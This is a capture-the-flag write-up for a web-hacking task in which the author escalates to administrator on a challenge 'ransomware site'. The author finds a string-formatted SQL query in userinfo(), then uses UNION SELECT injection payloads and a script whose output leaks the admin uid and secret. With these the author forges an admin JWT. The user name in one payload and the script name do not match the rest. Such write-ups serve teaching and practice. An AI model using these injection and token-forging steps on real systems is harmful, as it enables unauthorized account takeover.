<!-- HEADER -->
<div align="center">

# [\[<<\]](../Task6/) Task 7 - Privilege Escalation [\[>>\]](../Task8/)
![Category: Web Hacking, [redacted]](https://img.shields.io/badge/Category-Web_Hacking,_[redacted]-informational?style=flat-square)
![Points: 300](https://img.shields.io/badge/Points-300-43853D?style=flat-square)

![Task Screenshot](https://i.imgur.com/4diJM64.png)

</div>

<!-- DESCRIPTION -->
> With access to the site, you can access most of the functionality. But there's still that admin area that's locked off.
> 
> Generate a new token value which will allow you to access the ransomware site *as an administrator*.
> 
> ---
> 
> Enter a token value which will allow you to login as an administrator.
> ```
> ```

## Files
* [provided/](provided/)
	- (empty)
* [genAdminToken.py](genAdminToken.py) - Generates a new admin token.

<!-- BREAKDOWN & SOLUTION -->
## Breakdown & Solution
Using the token we generated in the [last task](../Task6/), we can add it to our cookies and try to login. We know that the cookie name is `tok` from the [data file](../Task5/data.txt) we found. While you can do this natively using browser dev tools, I prefer to use a cookie-editor plugin:

![cookie](https://i.imgur.com/v4lXbXp.png)

Now that we should be authenticated, lets go to forum (we saw what pages existed from the [site source](../TaskB2/repo/app/templates/)) and see if we can find anything:

![forum](https://i.imgur.com/ZwhpLtK.png)

Interesting site. Lets get back to the task at hand, we need get an admin token. Going to `/adminlist` we see that the admin `SoggyPlate` is online:

![adminlist](https://i.imgur.com/kmR3aDf.png)

(RIP evil rock 😔😔)

Ok but how are we going to get an admin token? Well we only have limited access to the site. Looking at the [source code](../TaskB2/repo/app/), we can see that `/lock` and `/unlock` aren't much use to us. However, `userinfo()` is pretty interesting:

```py
def userinfo():
	""" Create a page that displays information about a user """			
	query = request.values.get('user')
	if query == None:
		query =  util.get_username()	
	userName = memberSince = clientsHelped = hackersHelped = contributed = ''
	with util.userdb() as con:	
		infoquery= "SELECT u.memberSince, u.clientsHelped, u.hackersHelped, u.programsContributed FROM Accounts a INNER JOIN UserInfo u ON a.uid = u.uid WHERE a.userName='%s'" %query # here!
		row = con.execute(infoquery).fetchone()	
		if row != None:
			userName = query
			memberSince = int(row[0])
			clientsHelped = int(row[1])
			hackersHelped = int(row[2])
			contributed = int(row[3])
	if memberSince != '':
		memberSince = datetime.utcfromtimestamp(int(memberSince)).strftime('%Y-%m-%d')
	resp = make_response(render_template('userinfo.html', 
		userName=userName,
		memberSince=memberSince, 
		clientsHelped=clientsHelped,
		hackersHelped=hackersHelped, 
		contributed=contributed,
		pathkey=expected_pathkey()))
	return resp
```

Notice how the `infoquery` variable is not secure!

Compared to every other selection query we've seen so far:

```py
def validate_token(token):
	# snipped
	row = con.execute('SELECT secret FROM Accounts WHERE uid = ?', (claims['uid'],)).fetchone()
	# snipped

def generate_token(userName):
	# snipped
	row = con.execute("SELECT uid, secret from Accounts WHERE userName = ?", (userName,)).fetchone()
	# snipped
	
def get_username():
	# snipped
	row = con.execute("select userName from Accounts where uid = ?", (uid,)).fetchone()
	# snipped
```

They all use `con.execute("...?...", (var,)).fetchone()` but ours is different! We directly use a string format:
```py
	infoquery= "SELECT u.memberSince, u.clientsHelped, u.hackersHelped, u.programsContributed FROM Accounts a INNER JOIN UserInfo u ON a.uid = u.uid WHERE a.userName='%s'" %query # here!
```

Looking into this online, I found that con execute is secure against SQL injections, but unlike the rest, the one in `userinfo()` is not, these are sloppy mistakes that can be exploited!


We can see that in `userinfo()` it takes a request value of `user`:

```py
def userinfo():
	""" Create a page that displays information about a user """			
	query = request.values.get('user')
	if query == None:
		query =  util.get_username()	
	userName = memberSince = clientsHelped = hackersHelped = contributed = ''
```

This should just be equivalent of doing `/userinfo?user=0xfbad`! Lets try this with the admin's name `SoggyPlate`:

![userinfo](https://i.imgur.com/0Ah3Gvc.pngg)

Nice, so now we need to do a bit of SQL injection to get the admin's secret and user id. We can see that our input goes in that the query returns `memberSince, clientsHelped, hackersHelped, programsContributed`:

```py
if row != None:
	userName = query
	memberSince = int(row[0])
	clientsHelped = int(row[1])
	hackersHelped = int(row[2])
	contributed = int(row[3])
```

What instead we can do enter `'` so the query searches empty usernames (which there are none), then we UNION (combine) and select the information we want, in this case, just the user id. We can use this SQL payload:

```
' UNION SELECT 0, 0, 0, uid FROM Accounts WHERE userName='SoggyPlate' --
```
Lets go to `/userinfo?user=' UNION SELECT 0, 0, 0, uid FROM Accounts WHERE userName='SoggyPlate' --`:

![userinfo](https://i.imgur.com/6gVmwks.png)

Nice we got the admin's uid! (`15861`). Now we need to get the client secret. The issue however is that as we saw in the previous task, the client secret is a string, not a number. So we need somehow convert it to a number. What we'll do is convert the string into hex char by char and then convert it back via char codes:

```
' UNION SELECT 0, 0, 0, unicode(substr(secret, {index}, 1)) FROM Accounts WHERE userName='InexpensivePlastic' --
```

So lets run the [script](./genTargetToken.py) I made to automate this process

```
$ python genTargetToken.py
(..snipped..)

[!] Retrieved client secret:    6E4NYzI4gkMlEcYSZv5z1qaNKCoW2F2P

[*] Generating token with of "SoggyPlate" with uid: 15861 and secret: 6E4NYzI4gkMlEcYSZv5z1qaNKCoW2F2P
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzA1ODk3NDQsImV4cCI6MTcwMjEyNTc0NCwidWlkIjoxNTg2MSwic2VjIjoiNkU0Tll6STRna01sRWNZU1p2NXoxcWFOS0NvVzJGMlAifQ.3Hh1Q_Yz4SjhogG8FpvaAzUDpBJJqN_drXjb08u2Rt0
```

We got the client secret and thus were able to generate a new token! Lets submit `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzA1ODk3NDQsImV4cCI6MTcwMjEyNTc0NCwidWlkIjoxNTg2MSwic2VjIjoiNkU0Tll6STRna01sRWNZU1p2NXoxcWFOS0NvVzJGMlAifQ.3Hh1Q_Yz4SjhogG8FpvaAzUDpBJJqN_drXjb08u2Rt0`.

![Task Screenshot](https://i.imgur.com/7bVNFF1.png)

> ```
> Great! What can we find in the admin area?
> ```

<!-- TL;DR -->
## Technical TL;DR
The site owners left a vulnerable SQL injection in the `userinfo()` function. We were able to use this to get the admin's uid and client secret. Since we can only get back numbers in the response, we convert each char of the secret into its unicode representation and then convert it back into a char to build out the final secret. Then use the same process as task 6 to generate a new token with the admin's uid and secret.

---

<div align="center">

[return to top](#top)

</div>